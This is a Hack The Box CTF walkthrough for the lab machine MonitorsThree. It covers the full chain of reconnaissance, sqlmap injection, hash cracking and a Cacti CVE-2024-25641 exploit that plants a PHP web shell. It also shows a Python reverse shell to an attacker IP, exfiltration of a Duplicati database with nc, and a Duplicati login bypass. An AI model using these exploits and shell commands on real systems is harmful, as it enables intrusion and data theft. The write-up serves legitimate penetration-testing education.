---
title: CTF Walkthrough for HTB Machine MonitorsThree
date: 2024-12-21 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [HTB, Writeup, CVE, SQLi]   
image:
  path: /assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/box-monitorsthree.webp
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about MonitorsThree a Hack The Box machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: Blurry<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [MonitorsThree HTB](https://app.hackthebox.com/machines/MonitorsThree)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) SQLMap<br>
4) Chisel

## Reconnaissance
As with every penetration test, we start by enumerating open ports on our target using Nmap.
`sudo nmap -Pn -n 10.10.11.30 -sS -oN ports-dis.nmap`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/ports-dis.png){: .center}

Using the results of the port scan we then perform a target service scan on open ports.
`sudo nmap -Pn -n 10.10.11.30 -p22,80,8084 -sV -sC -oN services-dis.nmap`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/services-dis.png){: .center}

The service scan shows that the target runs SSH, Nginx, and Websnp services. We also see the domain of the target so we can add it to our `/etc/hosts` file.
`echo '10.10.11.30  monitorsthree.htb' | sudo tee -a /etc/hosts`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/hosts-config.png){: .center}

Let's browse the web application running on port 80. We can see that this resembles a normal company's website. This company appears to provide network services to its customers.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/first-browse.png){: .center}

While browsing the application manually to gain a more depth of the target we can fuzz Vhosts on our target.
`ffuf -u http://10.10.11.30 -H 'Host: FUZZ.monitorsthree.htb' -ic -w /usr/share/seclists/Discovery/DNS/namelist.txt -fs 13560`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/vhosts-fuzzing.png){: .center}


We discovered a new subdomain so let's add it to our `/etc/hosts` file.
`echo '10.10.11.30  cacti.monitorsthree.htb' | sudo tee -a /etc/hosts`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/hosts-config-2.png){: .center}

When visit to the cacti.monitorsthree.htb Vhost, we are greeted with a login page. This login page reveals the version number of a certain Cacti. A quick Google search shows that Cacti is an open-source, web-based network monitoring, performance, fault, and configuration management framework designed as a front-end application for the open-source, industry-standard data logging tool RRDtool. 
Now, with the version number we can make another Google search that reveals that the version of Cacti run by the target is indeed vulnerable to an authenticated RCE. Unfortunately, we have no valid credentials. 
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/exploit-discovery.png){: .center}

After browsing for a while, I realised that the http://monitorsthree.htb/forgot_password.php had different responses for valid and invalid usernames. This means the username is possibly checked in the database before the password request is sent and not just sent randomly.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/user-enum-proof-1.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/user-enum-proof-2.png){: .center}

With this new information, we can test this endpoint for SQL injection vulnerability.
```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php#' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Accept: text/html,application/xhtml+xml,applicat
ion/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://monitorsthree.htb/forgot_password.php' -H 'Content-Type: application/x
-www-form-urlencoded' -H 'Origin: http://monitorsthree.htb' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=8uk7d3mkbcva1bebn824l2uil7' -H 'Upgrade-Insecure-Requests: 1' --data-raw 'username=admin%29' --batch
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/injection-1.png){: .center}

We got a valid hit and the application is indeed vulnerable to SQL injection. we can now attempt to enumerate the database and dump users' passwords.
- Enumerating the current database.
```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php#' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Content-Type: application/x-www-form-urlencoded'
 -H 'Cookie: PHPSESSID=8uk7d3mkbcva1bebn824l2uil7' --data-raw 'username=admin%29' --batch --current-db  
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/db-enumeration-1.png){: .center}

- Enumerating tables in the monitorsthree_db database we discovered
```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php#' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Content-Type: application/x-www-form-urlencoded'
 -H 'Cookie: PHPSESSID=8uk7d3mkbcva1bebn824l2uil7' --data-raw 'username=admin%29' --batch --tables -D monitorsthree_db
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/db-enumeration-2.png){: .center}

- Enumerating the password column from the users table
```bash
sqlmap -u 'http://monitorsthree.htb/forgot_password.php#' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=8uk7d3mkbcva1bebn824l2uil7' --data-raw 'username=admin%29' --batch --tables -D monitorsthree_db -T users -C password --dump
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/db-enumeration-3.png){: .center}
*NB: We didn't dump the username table because we already obtained a valid user above thanks to the design of the web application.*

We have retrieved 2 password hashes out of four. From their length, they appear to be MD5. Let's crack them using Hashcat mode 0 and try both of them with the username admin.
`hashcat -m 0 -a 0 31a1xxxxxxxxxxxxxxxxxxxx430610e8 /usr/share/wordlists/rockyou.txt`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/passsword-crack.png){: .center}

We successfully cracked the second password so let's test for credentials reuse across different platforms by attempting to log into the cacti Vhost.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cacti-login.png){: .center}

We can see that the credentials we have are reused on both Vhost. Remember we discover that the version of cacti run by our target is vulnerable to CVE-2024-25641. 
To exploit the vulnerability, we can use the PHP script to generate a malicious package to import into Cacti.
```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/nicefile.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = '<?php system($_GET["cmd"]); ?>';
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("nicefile.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat nicefile.xml | gzip -9 > nicefile.xml.gz; rm nicefile.xml");
?>
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/exploit-compilation.png){: .center}

Now, we can log into Cacti with the admin credentials discovered above and go to **Import/Export** -> **Import Packages** to upload and import the `nicefile.xml.gz` file previously generated.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/exploitation.png){: .center}

The PHP file will be written into the `resource` directory and will be accessible using `/resource/nicefile.php` path. Let's test the payload by executing a basic command.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/shell-1.png){: .center}

Now that we can execute code on our target. We will leverage this to obtain a tty reverse shell by executing the following Python code on the target. Before executing this code we should start our NetCat listener on the appropriate port.
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.16",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/shell-sent.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/shell-gain.png){: .center}

After gaining a shell we can enumerate local users on the system by listing the content of the `/home` directory.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/home-user.png){: .center}

Now that we gain a shell, we can start the enumeration. Remember that we have two web applications running on this server and we could read the database of the first web application using the SQLi vulnerability. Now, let's try to enumerate the database of the second web application i.e. cacti. We can find the configuration file in the `/html/cacti/include/config.php` file.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/db-config.png){: .center}

We can connect to this database and enumerate all interesting columns.
`SELECT column_name, table_name, table_schema FROM information_schema.columns WHERE column_name LIKE '%pass%';`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cacti-db-login.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cacti-db-enum-1.png){: .center}

We can see an interesting table i.e. `user_auth`. We can enumerate the password hashes stored in this table to see if any name matches with a local user's name.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cacti-db-enum-2.png){: .center}

We see a password hash for a user Marcus who appears to be a local user on the system. Let's crack this hash and attempt to log in as Marcus on the system.
`hashcat -m 3200 -a 0 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/passsword-crack-2.png){: .center}

We successfully cracked the hash and we can use this to log in as Marcus. We can use this access to read the flag and further our enumeration.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/user-auth.png){: .center}

To obtain a more stable shell we can transfer Marcus's SSH private key to our attack host and use it to log in as Marcus.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/key-trans-1.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/key-trans-2.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/key-trans-3.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/ssh-auth.png){: .center}

We can start our enumeration by enumerating ports listening locally on the target.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-ports.png){: .center}

We can download Chisel on the target and scan those ports to identify running services.
- We can start a Python server in the directory containing Chisel.
```bash
┌──(pentester㉿kali)-[/opt]
└─$ ls -l
<SNIP>
-rw-r--r-- 1 root root 8654848 Aug 20  2023 chisel

┌──(pentester㉿kali)-[/opt]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- We can use wget on the target to download Chisel from our attack host and run it in server mode.
```bash
marcus@monitorsthree.htb:/tmp$ wget 10.10.14.16/chisel; chmod 755 chisel
<SNIP>            
2024-09-26 17:30:41 (2.26 MB/s) - ‘chisel’ saved [8654848/8654848]
<SNIP>

marcus@monitorsthree.htb:/tmp$./chisel  server -p 4444 --socks5&
[1] 1417
```

- Next, we need to connect to the Chisel server running on the target using the Chisel client.
```bash
┌──(pentester㉿kali)-[~/MonitorsThree/Misc Files]
└─$chisel client -v 10.10.11.30:4444 socks
2024/09/13 23:18:27 client: Connecting to ws://10.10.11.30:4444
2024/09/13 23:18:27 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2024/09/13 23:18:27 client: tun: Bound proxies
2024/09/13 23:18:27 client: Handshaking...
2024/09/13 23:18:27 client: Sending config
2024/09/13 23:18:27 client: Connected (Latency 1.745593ms)
2024/09/13 23:18:27 client: tun: SSH connected
```

The last step is to add the SOCKS5 port of the proxy we created in the Proxychains configuration file and use it to scan local ports on the target.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-service-scan.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/internal-service-scan-1.png){: .center}

We can see here that Duplicati is running locally on port 8200 of our target. This is vulnerable to an authentication bypass vulnerability. This [post](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) post explains in detail how to exploit this vulnerability.
First, we need to locate the Duplicati database and transfer it to our attack host.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-location.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-received.png){: .center}

```bash
marcus@monitorsthree.htb: /opt/duplicati/config$ nc -q 0  10.10.14.16  9000 < Duplicati-server.sqlite 
```
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-db-received.png){: .center}

Now that we have the database on our attack host, we can use SQLitebrowser to read the Duplicati server passphrase.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-server-passphrasse.png){: .center}

I found it more comfortable to use SSH local port forwarding to reach to Duplicati server from my browser so I used it.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/local-port-forwarding.png){: .center}

Following the blog post, we need to initiate a login process while capturing each request in the process. 
- Let's start by entering a random password in the password field.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/random-password.png){: .center}

- Next, In the intercepted requests we can see the Nonce that will be used to create a valid password
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/nonce-capture.png){: .center}

- We now need to decode the server passphrase we saw in the SQLite database from Base64 and use the Hex output to generate a new password in our browser.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/cybercheff.png){: .center}

- To generate a valid password we need the Nonce we captured above and the base64 decoded output of the server's passphrase.
`var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(<Nonce>) + <Base64 decoded passphrase>)).toString(CryptoJS.enc.Base64);`
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/nonce-password.png){: .center}

- Last, we can copy the nonce password and replace it with the value of the password we see in the HTTP request during the login process to completely log in.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/pass-modification.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/duplicati-login.png){: .center}

Duplicati is a backup solution for many companies. This instance runs in a docker container but after enumeration, I noticed that the host file system is mounted to the `/source` directory of the docker container. Since this application runs as root, we can start a backup process that will backup the root's files. For this machine, we will back up the root flag. We can create a backup process as shown below.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/add-backup.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/backup-des.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/backup-root-flag.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/home-to-start-backup.png){: .center}

After we backup those files we can see them in the `tmp` directory as we mentioned above.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/created-backups.png){: .center}

Now that we have backed up the root flag, we can use Duplicati to restore that file in the same `tmp` directory.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/restore-1.png){: .center}
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/restore-2.png){: .center}

After restoring the backups, we can read the root file.
![](/assets/img/posts/walthrough/hackthebox/2024-12-21-monitorsthree/root-flag.png){: .center}
